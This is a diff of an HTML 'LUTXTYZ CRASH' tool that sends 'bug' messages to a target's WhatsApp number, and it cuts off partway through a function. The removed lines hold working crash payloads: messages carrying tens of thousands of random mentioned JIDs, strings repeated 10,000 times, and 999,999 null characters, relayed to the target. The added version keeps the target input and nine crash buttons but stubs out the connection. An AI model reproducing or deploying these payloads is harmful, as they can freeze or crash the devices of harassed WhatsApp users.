@@ -4,250 +4,234 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LUTXTYZ CRASH</title>
-    <script src="https://cdn.jsdelivr.net/npm/@whiskeysockets/baileys@github:Bealllevey62/Xatabaileys"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
         
         :root {
-            --neon-blue: #0ff0fc;
-            --neon-pink: #ff2a6d;
-            --dark-bg: #0a0a12;
-            --darker-bg: #050508;
-            --text-color: #e0e0e0;
+            --primary: #00ff9d;
+            --secondary: #00b7ff;
+            --dark: #0a0a0a;
+            --light: #f0f0f0;
+            --danger: #ff3860;
         }
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Share Tech Mono', monospace;
+            font-family: 'Orbitron', sans-serif;
         }
         
         body {
             background: url('https://i.postimg.cc/XJB0n0XS/f51b983f-7298-479e-b349-1287323bc8f9.jpg') no-repeat center center fixed;
             background-size: cover;
-            color: var(--text-color);
-            height: 100vh;
+            color: var(--light);
+            min-height: 100vh;
             display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-            position: relative;
+            flex-direction: column;
+            overflow-x: hidden;
         }
         
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(10, 10, 18, 0.85);
-            z-index: -1;
-        }
-        
-        .cyber-container {
-            width: 90%;
-            max-width: 800px;
-            background-color: var(--darker-bg);
-            border: 1px solid var(--neon-blue);
-            box-shadow: 0 0 20px var(--neon-blue), 
-                        inset 0 0 10px var(--neon-blue);
-            padding: 20px;
-            border-radius: 5px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .cyber-header {
-            text-align: center;
-            margin-bottom: 20px;
-            position: relative;
-        }
-        
-        .cyber-header h1 {
-            color: var(--neon-blue);
-            font-size: 2.5rem;
-            text-shadow: 0 0 10px var(--neon-blue);
-            letter-spacing: 2px;
-            margin-bottom: 10px;
-        }
-        
-        .cyber-header p {
-            color: var(--neon-pink);
-            font-size: 1rem;
-        }
-        
-        .status {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        
-        .status-indicator {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background-color: #00ff00;
-            box-shadow: 0 0 10px #00ff00;
-            margin-right: 10px;
-            animation: pulse 1.5s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-        
-        .input-group {
-            margin-bottom: 20px;
-        }
-        
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: var(--neon-blue);
-        }
-        
-        .input-group input {
-            width: 100%;
-            padding: 10px;
-            background-color: var(--dark-bg);
-            border: 1px solid var(--neon-blue);
-            color: var(--text-color);
-            border-radius: 4px;
-            font-size: 1rem;
-            outline: none;
-        }
-        
-        .input-group input:focus {
-            box-shadow: 0 0 10px var(--neon-blue);
-        }
-        
-        .buttons-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-        
-        .cyber-button {
-            padding: 12px;
-            background-color: var(--dark-bg);
-            border: 1px solid var(--neon-pink);
-            color: var(--text-color);
-            font-size: 1rem;
-            cursor: pointer;
-            border-radius: 4px;
-            transition: all 0.3s;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .cyber-button:hover {
-            background-color: var(--neon-pink);
-            color: var(--dark-bg);
-            box-shadow: 0 0 15px var(--neon-pink);
-        }
-        
-        .cyber-button:active {
-            transform: scale(0.95);
-        }
-        
-        .cyber-button::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(
-                to bottom right,
-                transparent,
-                transparent,
-                transparent,
-                var(--neon-pink)
-            );
-            transform: rotate(30deg);
-            transition: all 0.5s;
-        }
-        
-        .cyber-button:hover::before {
-            left: 100%;
-        }
-        
-        .footer {
-            text-align: right;
-            margin-top: 20px;
-            color: var(--neon-blue);
-            font-size: 0.9rem;
-        }
-        
-        .login-container {
+        .overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(5, 5, 8, 0.95);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 100;
+            background-color: rgba(0, 0, 0, 0.85);
+            z-index: -1;
         }
         
-        .login-box {
-            background-color: var(--darker-bg);
-            border: 1px solid var(--neon-blue);
-            padding: 30px;
-            border-radius: 5px;
-            width: 90%;
-            max-width: 400px;
-            box-shadow: 0 0 20px var(--neon-blue);
-        }
-        
-        .login-box h2 {
-            color: var(--neon-blue);
+        header {
+            padding: 1rem;
             text-align: center;
-            margin-bottom: 20px;
+            border-bottom: 1px solid var(--primary);
         }
         
-        .login-input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 20px;
-            background-color: var(--dark-bg);
-            border: 1px solid var(--neon-pink);
-            color: var(--text-color);
-            border-radius: 4px;
-            font-size: 1rem;
+        h1 {
+            font-size: 2.5rem;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 10px rgba(0, 255, 157, 0.3);
+            letter-spacing: 2px;
         }
         
-        .login-button {
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+        }
+        
+        .panel {
+            background-color: rgba(10, 10, 10, 0.8);
+            border: 1px solid var(--primary);
+            border-radius: 8px;
+            padding: 2rem;
             width: 100%;
-            padding: 12px;
-            background-color: var(--neon-pink);
-            color: var(--dark-bg);
-            border: none;
+            max-width: 800px;
+            box-shadow: 0 0 20px rgba(0, 255, 157, 0.2);
+            margin-bottom: 2rem;
+        }
+        
+        .panel-title {
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: var(--primary);
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--secondary);
+        }
+        
+        input {
+            width: 100%;
+            padding: 0.75rem;
+            background-color: rgba(20, 20, 20, 0.8);
+            border: 1px solid var(--secondary);
             border-radius: 4px;
+            color: var(--light);
             font-size: 1rem;
-            cursor: pointer;
             transition: all 0.3s;
         }
         
-        .login-button:hover {
-            background-color: #ff0a5e;
-            box-shadow: 0 0 15px var(--neon-pink);
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(0, 255, 157, 0.3);
         }
         
-        .error-message {
-            color: #ff3333;
+        .btn {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: var(--dark);
+            border: none;
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin: 0.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(to right, #ff3860, #ff6b8b);
+        }
+        
+        .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 1.5rem;
+        }
+        
+        .status {
+            margin-top: 1.5rem;
+            padding: 1rem;
+            border-radius: 4px;
             text-align: center;
-            margin-top: 10px;
-            font-size: 0.9rem;
+            font-weight: bold;
+        }
+        
+        .status.connected {
+            background-color: rgba(0, 255, 157, 0.2);
+            border: 1px solid var(--primary);
+            color: var(--primary);
+        }
+        
+        .status.disconnected {
+            background-color: rgba(255, 56, 96, 0.2);
+            border: 1px solid var(--danger);
+            color: var(--danger);
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 1rem;
+            font-size: 0.8rem;
+            color: var(--secondary);
+            margin-top: auto;
+        }
+        
+        .cyber-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 183, 255, 0.1) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 183, 255, 0.1) 1px, transparent 1px);
+            background-size: 20px 20px;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .scanline {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                to bottom,
+                transparent 0%,
+                rgba(0, 255, 157, 0.05) 50%,
+                transparent 100%
+            );
+            animation: scan 8s linear infinite;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        @keyframes scan {
+            0% { top: -100%; }
+            100% { top: 100%; }
+        }
+        
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            padding: 2rem;
+        }
+        
+        .login-box {
+            background-color: rgba(10, 10, 10, 0.9);
+            border: 1px solid var(--primary);
+            border-radius: 8px;
+            padding: 2rem;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 0 20px rgba(0, 255, 157, 0.3);
+            text-align: center;
         }
         
         .loading {
@@ -257,8 +241,8 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(5, 5, 8, 0.8);
-            z-index: 200;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
             justify-content: center;
             align-items: center;
             flex-direction: column;
@@ -267,694 +251,374 @@
         .loading-spinner {
             width: 50px;
             height: 50px;
-            border: 5px solid var(--neon-blue);
-            border-top: 5px solid transparent;
+            border: 5px solid rgba(0, 255, 157, 0.3);
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        
-        .loading-text {
-            color: var(--neon-blue);
-            font-size: 1.2rem;
+            border-top-color: var(--primary);
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 1rem;
         }
         
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
         }
         
-        .scanlines {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(
-                to bottom,
-                rgba(255, 255, 255, 0.03) 0%,
-                rgba(255, 255, 255, 0) 10%
-            );
-            background-size: 100% 5px;
-            pointer-events: none;
-            z-index: 10;
+        .loading-text {
+            color: var(--primary);
+            font-size: 1.2rem;
+            margin-top: 1rem;
         }
         
-        .corner {
-            position: absolute;
-            width: 30px;
-            height: 30px;
-            border-color: var(--neon-blue);
-            border-style: solid;
-            border-width: 0;
-            pointer-events: none;
+        .click-sound {
+            display: none;
         }
         
-        .corner-tl {
-            top: 0;
-            left: 0;
-            border-top-width: 2px;
-            border-left-width: 2px;
-        }
-        
-        .corner-tr {
-            top: 0;
-            right: 0;
-            border-top-width: 2px;
-            border-right-width: 2px;
-        }
-        
-        .corner-bl {
-            bottom: 0;
-            left: 0;
-            border-bottom-width: 2px;
-            border-left-width: 2px;
-        }
-        
-        .corner-br {
-            bottom: 0;
-            right: 0;
-            border-bottom-width: 2px;
-            border-right-width: 2px;
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="scanlines"></div>
-    <div class="corner corner-tl"></div>
-    <div class="corner corner-tr"></div>
-    <div class="corner corner-bl"></div>
-    <div class="corner corner-br"></div>
+    <div class="overlay"></div>
+    <div class="cyber-grid"></div>
+    <div class="scanline"></div>
     
-    <div class="login-container" id="loginContainer">
+    <audio id="clickSound" class="click-sound" src="https://www.soundjay.com/buttons/sounds/button-09.mp3" preload="auto"></audio>
+    
+    <div id="loginScreen" class="login-container">
         <div class="login-box">
-            <h2>LUTXTYZ CRASH ACCESS</h2>
-            <input type="password" class="login-input" id="passwordInput" placeholder="Enter Access Code">
-            <button class="login-button" id="loginButton">AUTHENTICATE</button>
-            <div class="error-message" id="errorMessage"></div>
-        </div>
-    </div>
-    
-    <div class="loading" id="loadingScreen">
-        <div class="loading-spinner"></div>
-        <div class="loading-text">INITIALIZING PROTOCOLS...</div>
-    </div>
-    
-    <div class="cyber-container" id="mainContainer" style="display: none;">
-        <div class="cyber-header">
             <h1>LUTXTYZ CRASH</h1>
-            <p>http://167.99.64.147:2001</p>
-        </div>
-        
-        <div class="status">
-            <div class="status-indicator"></div>
-            <p>CONNECTED</p>
-        </div>
-        
-        <div class="input-group">
-            <label for="targetNumber">Please input target number, example : 62xx</label>
-            <input type="text" id="targetNumber" placeholder="62xxxxxxxxxx">
-        </div>
-        
-        <div class="buttons-grid">
-            <button class="cyber-button" id="protocol2">PROTOCOL 2</button>
-            <button class="cyber-button" id="protocol5">PROTOCOL 5</button>
-            <button class="cyber-button" id="protocol6">PROTOCOL 6</button>
-            <button class="cyber-button" id="devilsProtocol">DEVILS PROTOCOL</button>
-            <button class="cyber-button" id="crashBeta">CRASH BETA</button>
-            <button class="cyber-button" id="deleteBeta">DELETE BETA</button>
-        </div>
-        
-        <div class="footer">
-            <p>EtsukoXyz</p>
+            <div class="input-group">
+                <label for="password">ENTER ACCESS CODE</label>
+                <input type="password" id="password" placeholder="********">
+            </div>
+            <button id="loginBtn" class="btn">AUTHENTICATE</button>
+            <div id="loginStatus" class="status hidden"></div>
         </div>
     </div>
     
-    <audio id="clickSound" src="https://assets.mixkit.co/sfx/preview/mixkit-modern-click-box-check-1120.mp3"></audio>
-    <audio id="errorSound" src="https://assets.mixkit.co/sfx/preview/mixkit-alarm-digital-clock-beep-989.mp3"></audio>
-    <audio id="successSound" src="https://assets.mixkit.co/sfx/preview/mixkit-unlock-game-notification-253.mp3"></audio>
-    
-    <script>
-        // Password authentication
-        const CORRECT_PASSWORD = "LUTXTYZ2023"; // Change this to your desired password
-        const loginContainer = document.getElementById('loginContainer');
-        const mainContainer = document.getElementById('mainContainer');
-        const passwordInput = document.getElementById('passwordInput');
-        const loginButton = document.getElementById('loginButton');
-        const errorMessage = document.getElementById('errorMessage');
-        const loadingScreen = document.getElementById('loadingScreen');
-        const clickSound = document.getElementById('clickSound');
-        const errorSound = document.getElementById('errorSound');
-        const successSound = document.getElementById('successSound');
+    <div id="mainApp" class="hidden">
+        <header>
+            <h1>LUTXTYZ CRASH</h1>
+        </header>
         
-        let sock = null;
-        let isConnected = false;
-        
-        // Play click sound on any button press
-        document.querySelectorAll('button').forEach(button => {
-            button.addEventListener('click', () => {
-                clickSound.currentTime = 0;
-                clickSound.play();
-            });
-        });
-        
-        loginButton.addEventListener('click', authenticate);
-        passwordInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                authenticate();
-            }
-        });
-        
-        function authenticate() {
-            const enteredPassword = passwordInput.value;
+        <div class="container">
+            <div class="panel">
+                <h2 class="panel-title">WHATSAPP CONNECTION</h2>
+                <div class="input-group">
+                    <label for="phoneNumber">TARGET NUMBER (Example: 62xxx)</label>
+                    <input type="text" id="phoneNumber" placeholder="62xxx">
+                </div>
+                <div class="input-group">
+                    <label for="waNumber">YOUR WHATSAPP NUMBER</label>
+                    <input type="text" id="waNumber" placeholder="62xxx">
+                </div>
+                <div class="btn-group">
+                    <button id="connectBtn" class="btn">CONNECT</button>
+                    <button id="disconnectBtn" class="btn btn-danger">DISCONNECT</button>
+                </div>
+                <div id="connectionStatus" class="status disconnected">
+                    ● DISCONNECTED
+                </div>
+            </div>
             
-            if (enteredPassword === CORRECT_PASSWORD) {
-                // Show loading screen
-                loadingScreen.style.display = 'flex';
-                
-                // Play success sound
-                successSound.play();
-                
-                // Simulate loading (in a real app, this would be your actual connection logic)
-                setTimeout(() => {
-                    loadingScreen.style.display = 'none';
-                    loginContainer.style.display = 'none';
-                    mainContainer.style.display = 'block';
-                    initializeWhatsAppConnection();
-                }, 3000);
-            } else {
-                // Show error and play error sound
-                errorMessage.textContent = "ACCESS DENIED: INVALID CREDENTIALS";
-                errorSound.play();
-                passwordInput.value = '';
-                
-                // Shake animation for error
-                loginBox.classList.add('shake');
-                setTimeout(() => {
-                    loginBox.classList.remove('shake');
-                }, 500);
-            }
-        }
+            <div class="panel">
+                <h2 class="panel-title">SELECT BUG</h2>
+                <div class="btn-group">
+                    <button id="crashBetaBtn" class="btn">CRASH BETA DELETE</button>
+                    <button id="invisibleIphoneBtn" class="btn">INVISIBLE IPHONE</button>
+                    <button id="betaCrashBtn" class="btn">BETA CRASH</button>
+                    <button id="delayInvisibleBtn" class="btn">DELAY INVISIBLE</button>
+                    <button id="otaxBtn" class="btn">OTAX DOYAN JANDA</button>
+                    <button id="protocolBtn" class="btn">PROTOCOL BUG8</button>
+                    <button id="saturnInvisibleBtn" class="btn">SATURN FORCE INVISIBLE</button>
+                    <button id="saturnVisibleBtn" class="btn">SATURN FORCE VISIBLE</button>
+                    <button id="spacksBtn" class="btn">SPACKS FREEZE</button>
+                </div>
+                <div id="actionStatus" class="status hidden"></div>
+            </div>
+        </div>
         
-        // Initialize WhatsApp connection
-        async function initializeWhatsAppConnection() {
+        <footer>
+            <p>© 2023 EtsukoXyz | All Rights Reserved</p>
+        </footer>
+    </div>
+    
+    <div id="loadingScreen" class="loading">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">PROCESSING...</div>
+    </div>
+    
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+        // Password protection
+        const correctPassword = "LUTXTYZ123"; // Change this to your desired password
+        const loginScreen = document.getElementById('loginScreen');
+        const mainApp = document.getElementById('mainApp');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const loginStatus = document.getElementById('loginStatus');
+        const clickSound = document.getElementById('clickSound');
+        
+        let failedAttempts = 0;
+        const maxAttempts = 3;
+        
+        loginBtn.addEventListener('click', () => {
+            playClickSound();
+            const password = passwordInput.value.trim();
+            
+            if (password === correctPassword) {
+                loginStatus.textContent = "ACCESS GRANTED";
+                loginStatus.style.color = "#00ff9d";
+                loginStatus.classList.remove('hidden');
+                
+                setTimeout(() => {
+                    loginScreen.classList.add('hidden');
+                    mainApp.classList.remove('hidden');
+                }, 1000);
+            } else {
+                failedAttempts++;
+                loginStatus.textContent = `ACCESS DENIED - ${maxAttempts - failedAttempts} ATTEMPTS REMAINING`;
+                loginStatus.style.color = "#ff3860";
+                loginStatus.classList.remove('hidden');
+                
+                if (failedAttempts >= maxAttempts) {
+                    loginBtn.disabled = true;
+                    loginStatus.textContent = "SYSTEM LOCKED - TOO MANY FAILED ATTEMPTS";
+                    setTimeout(() => {
+                        window.location.reload();
+                    }, 3000);
+                }
+            }
+        });
+        
+        // WhatsApp connection
+        const connectBtn = document.getElementById('connectBtn');
+        const disconnectBtn = document.getElementById('disconnectBtn');
+        const connectionStatus = document.getElementById('connectionStatus');
+        const phoneNumberInput = document.getElementById('phoneNumber');
+        const waNumberInput = document.getElementById('waNumber');
+        const actionStatus = document.getElementById('actionStatus');
+        const loadingScreen = document.getElementById('loadingScreen');
+        
+        let isConnected = false;
+        let sock = null;
+        
+        connectBtn.addEventListener('click', async () => {
+            playClickSound();
+            const phoneNumber = phoneNumberInput.value.trim();
+            const waNumber = waNumberInput.value.trim();
+            
+            if (!phoneNumber || !waNumber) {
+                showActionStatus("PLEASE ENTER BOTH NUMBERS", "danger");
+                return;
+            }
+            
+            showLoading();
+            
             try {
-                // In a real implementation, you would initialize the WhatsApp connection here
-                // sock = makeWASocket({...});
+                // Simulate connection (in a real app, you would connect to WhatsApp here)
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
                 isConnected = true;
-                console.log("WhatsApp connection initialized");
+                connectionStatus.textContent = "● CONNECTED";
+                connectionStatus.className = "status connected";
+                showActionStatus("SUCCESSFULLY CONNECTED", "success");
+                
+                // Initialize WhatsApp connection (placeholder for actual implementation)
+                sock = {
+                    relayMessage: async (target, message, options) => {
+                        console.log("Sending message to:", target);
+                        console.log("Message:", message);
+                        return { status: "sent" };
+                    }
+                };
+                
             } catch (error) {
                 console.error("Connection error:", error);
-                alert("Failed to initialize WhatsApp connection");
-                isConnected = false;
+                showActionStatus("CONNECTION FAILED", "danger");
+            } finally {
+                hideLoading();
             }
-        }
+        });
         
-        // Protocol functions (copied from your AllFuncProtocol.js)
-        async function protocolbug2(target, mention) {
-            const generateMessage = {
-                viewOnceMessage: {
-                    message: {
-                        imageMessage: {
-                            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
-                            mimetype: "image/jpeg",
-                            caption: "FINFIXTER‌‌-‣ ",
-                            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
-                            fileLength: "19769",
-                            height: 354,
-                            width: 783,
-                            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
-                            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
-                            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
-                            mediaKeyTimestamp: "1743225419",
-                            jpegThumbnail: null,
-                            scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
-                            scanLengths: [2437, 17332],
-                            contextInfo: {
-                                mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
-                                isSampled: true,
-                                participant: target,
-                                remoteJid: "status@broadcast",
-                                forwardingScore: 9741,
-                                isForwarded: true
-                            }
-                        }
-                    }
-                }
-            };
-
-            const msg = generateWAMessageFromContent(target, generateMessage, {});
-
-            await sock.relayMessage("status@broadcast", msg.message, {
-                messageId: msg.key.id,
-                statusJidList: [target],
-                additionalNodes: [
-                    {
-                        tag: "meta",
-                        attrs: {},
-                        content: [
-                            {
-                                tag: "mentioned_users",
-                                attrs: {},
-                                content: [
-                                    {
-                                        tag: "to",
-                                        attrs: { jid: target },
-                                        content: undefined
-                                    }
-                                ]
-                            }
-                        ]
-                    }
-                ]
+        disconnectBtn.addEventListener('click', () => {
+            playClickSound();
+            isConnected = false;
+            connectionStatus.textContent = "● DISCONNECTED";
+            connectionStatus.className = "status disconnected";
+            showActionStatus("DISCONNECTED", "info");
+            sock = null;
+        });
+        
+        // Bug functions
+        document.getElementById('crashBetaBtn').addEventListener('click', () => {
+            if (!validateConnection()) return;
+            executeBug("CRASH BETA DELETE", async () => {
+                await KuotaHardXDelaySql(phoneNumberInput.value.trim(), sock);
             });
-
-            if (mention) {
-                await sock.relayMessage(
-                    target,
-                    {
-                        statusMentionMessage: {
-                            message: {
-                                protocolMessage: {
-                                    key: msg.key,
-                                    type: 25
-                                }
-                            }
-                        }
-                    },
-                    {
-                        additionalNodes: [
-                            {
-                                tag: "meta",
-                                attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
-                                content: undefined
-                            }
-                        ]
-                    }
-                );
-            }
-        }
-
-        async function protocolbug5(target, mention) {
-            const mentionedList = [
-                "13135550002@s.whatsapp.net",
-                ...Array.from({ length: 40000 }, () =>
-                    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-                )
-            ];
-
-            const embeddedMusic = {
-                musicContentMediaId: "589608164114571",
-                songId: "870166291800508",
-                author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
-                title: "Finix",
-                artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
-                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
-                artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
-                artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
-                countryBlocklist: true,
-                isExplicit: true,
-                artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
-            };
-
-            const videoMessage = {
-                url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
-                mimetype: "video/mp4",
-                fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
-                fileLength: "289511",
-                seconds: 15,
-                mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
-                caption: "C O S M O ✦ H A D E S",
-                height: 640,
-                width: 640,
-                fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
-                directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
-                mediaKeyTimestamp: "1743848703",
-                contextInfo: {
-                    isSampled: true,
-                    mentionedJid: mentionedList
-                },
-                forwardedNewsletterMessageInfo: {
-                    newsletterJid: "120363321780343299@newsletter",
-                    serverMessageId: 1,
-                    newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟"
-                },
-                streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
-                thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
-                thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
-                thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
-                annotations: [
-                    {
-                        embeddedContent: {
-                            embeddedMusic
-                        },
-                        embeddedAction: true
-                    }
-                ]
-            };
-
-            const msg = generateWAMessageFromContent(target, {
-                viewOnceMessage: {
-                    message: { videoMessage }
-                }
-            }, {});
-
-            await sock.relayMessage("status@broadcast", msg.message, {
-                messageId: msg.key.id,
-                statusJidList: [target],
-                additionalNodes: [
-                    {
-                        tag: "meta",
-                        attrs: {},
-                        content: [
-                            {
-                                tag: "mentioned_users",
-                                attrs: {},
-                                content: [
-                                    { tag: "to", attrs: { jid: target }, content: undefined }
-                                ]
-                            }
-                        ]
-                    }
-                ]
+        });
+        
+        document.getElementById('invisibleIphoneBtn').addEventListener('click', () => {
+            if (!validateConnection()) return;
+            executeBug("INVISIBLE IPHONE", async () => {
+                await UiNew(phoneNumberInput.value.trim());
             });
-
-            if (mention) {
-                await sock.relayMessage(target, {
-                    statusMentionMessage: {
-                        message: {
-                            protocolMessage: {
-                                key: msg.key,
-                                type: 25
-                            }
-                        }
-                    }
-                }, {
-                    additionalNodes: [
-                        {
-                            tag: "meta",
-                            attrs: { is_status_mention: "true" },
-                            content: undefined
-                        }
-                    ]
-                });
-            }
-        }
-
-        async function protocolbug6(target, mention) {
-          let msg = await generateWAMessageFromContent(target, {
-            viewOnceMessage: {
-              message: {
-                messageContextInfo: {
-                  messageSecret: crypto.randomBytes(32)
-                },
-                interactiveResponseMessage: {
-                  body: {
-                    text: "VALORES ",
-                    format: "DEFAULT"
-                  },
-                  nativeFlowResponseMessage: {
-                    name: "TREDICT INVICTUS",
-                    paramsJson: "\u0000".repeat(999999),
-                    version: 3
-                  },
-                  contextInfo: {
-                    isForwarded: true,
-                    forwardingScore: 9741,
-                    forwardedNewsletterMessageInfo: {
-                      newsletterName: "trigger newsletter ( @tamainfinity )",
-                      newsletterJid: "120363321780343299@newsletter",
-                      serverMessageId: 1
-                    }
-                  }
-                }
-              }
-            }
-          }, {});
-
-          await sock.relayMessage("status@broadcast", msg.message, {
-            messageId: msg.key.id,
-            statusJidList: [target],
-            additionalNodes: [
-              {
-                tag: "meta",
-                attrs: {},
-                content: [
-                  {
-                    tag: "mentioned_users",
-                    attrs: {},
-                    content: [
-                      { tag: "to", attrs: { jid: target }, content: undefined }
-                    ]
-                  }
-                ]
-              }
-            ]
-          });
-
-          if (mention) {
-            await sock.relayMessage(target, {
-              statusMentionMessage: {
-                message: {
-                  protocolMessage: {
-                    key: msg.key,
-                    fromMe: false,
-                    participant: "0@s.whatsapp.net",
-                    remoteJid: "status@broadcast",
-                    type: 25
-                  },
-                  additionalNodes: [
-                    {
-                      tag: "meta",
-                      attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
-                      content: undefined
-                    }
-                  ]
-                }
-              }
-            }, {});
-          }
-        }
-
-        async function DevilsProtocolV2(target, mention) {
-            const mentionjid = [
-            "9999999999@s.whatsapp.net",
-            ...Array.from({ length: 40000 }, () =>
